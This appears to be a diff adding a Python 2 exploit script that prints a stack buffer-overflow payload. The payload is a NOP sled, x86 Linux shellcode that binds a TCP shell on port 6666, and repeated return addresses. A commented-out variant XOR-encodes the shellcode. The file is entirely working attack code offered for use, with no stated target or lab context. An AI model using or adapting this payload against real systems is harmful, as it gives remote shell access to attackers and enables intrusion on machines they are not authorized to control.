@@ -1,0 +1,38 @@
+#! /usr/bin/python2
+from __future__ import print_function
+
+BUFSIZE = 6080
+
+RET_LOC = 0x804873a
+RET_LOC = '\x3a\x87\x04\x08'
+
+BUF_NOP = chr(0x90)
+
+START = '\n\n\n\n'
+
+LOCATION = '\x10\xe0\xff\xbf'
+
+# Linux (x86) TCP shell binding to port 6666.
+bind_shell =\
+  "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +\
+  "\x80\x5b\x5e\x52\x68\x02\x00\x1a\x0a\x6a\x10\x51\x50\x89" +\
+  "\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd" +\
+  "\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49" +\
+  "\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +\
+  "\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+def buf(string):
+  l = [''] * len(string)
+  for i in xrange(len(string)):
+    c = string[i]
+    l[i] = chr(ord(c) ^ 0x42)
+  return reduce(lambda a,b: a+b,l)
+  
+LEN_NOP = 6080 - len(START) - len(bind_shell) - 4
+
+LEN_RET = 7
+
+print(START + (BUF_NOP*(LEN_NOP)) + bind_shell + (BUF_NOP*4) +
+    (RET_LOC*LEN_RET) + '\x00',end='') #[:(6080+32)]
+
+# print (BUF_NOP*(6080-len(bind_shell)) + buf(bind_shell) + LOCATION*20000 )[:6080*3]
